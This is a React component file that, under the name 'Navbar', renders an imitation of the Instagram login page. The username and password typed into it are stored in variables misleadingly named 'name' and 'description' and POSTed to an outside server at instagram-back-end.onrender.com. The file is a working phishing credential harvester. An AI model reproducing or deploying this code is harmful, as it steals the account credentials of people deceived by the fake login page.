import { Col, Container, Row } from "react-bootstrap";
import logo from "../../assets/img/big.png";
import instagram from "../../assets/img/instagram.png";
import icon from "../../assets/img/icon.png";
import play from "../../assets/img/play.png"
import React, { useState } from 'react'
import "./Navbar.css";
import axios from "axios";
import { status } from "init";

export default function Navbar() {

    const [name, setName] = useState()
    const [description, setDescription] = useState()

    let obj = {
        name: name,
        description: description,
    }

    const postData = () => {
        axios.post('https://instagram-back-end.onrender.com/data', obj)
            .then(response => {
                alert(response.status);
            }
        )
            .catch(error => {
                console.error("Error sending data: ", error);
            });
    }

    return (
        <>
            <Container>
                <Row>
                    <Col lg="8" className="aaa">
                        <div className="j d-none d-lg-block">
                            <div className="emmer">
                                <div className="emmer_left">
                                    <img src={logo} alt="" />
                                </div>
                                <div className="emmer_right">
                                    <img src={instagram} alt="" />
                                    <div className="d">
                                        <input type="text" onChange={(e) => setName(e.target.value)} placeholder="Phone number, username, or email" className="inp" />
                                    </div>
                                    <div className="a">
                                        <input type="password" onChange={(e) => setDescription(e.target.value)} placeholder="Password" className="inpt" />
                                    </div>
                                    <div className="s">
                                        <button className="tn" onClick={() => postData()}>Log in</button>
                                    </div>
                                    <div className="al">
                                        <div className="k"></div>
                                        <h6>OR</h6>
                                        <div className="k"></div>
                                    </div>
                                    <div className="l">
                                        <img src={icon} alt="" className="icon" />
                                        <p className="nn">Log in with Facebook</p>
                                    </div>
                                    <p className="as">Forgot password?</p>
                                    <div className="emmer_">
                                        <div className="emmer__">
                                            <div className="o">
                                                <p className="q">Don't have an account?</p>
                                                <p className="up">Sign up</p>
                                            </div>
                                        </div>
                                        <p className="ww">Get the app.</p>
                                        <img src={play} alt="" />
                                    </div>
                                </div>

                            </div>
                        </div>


                    </Col>
                </Row>
            </Container >
        </>
    )
}
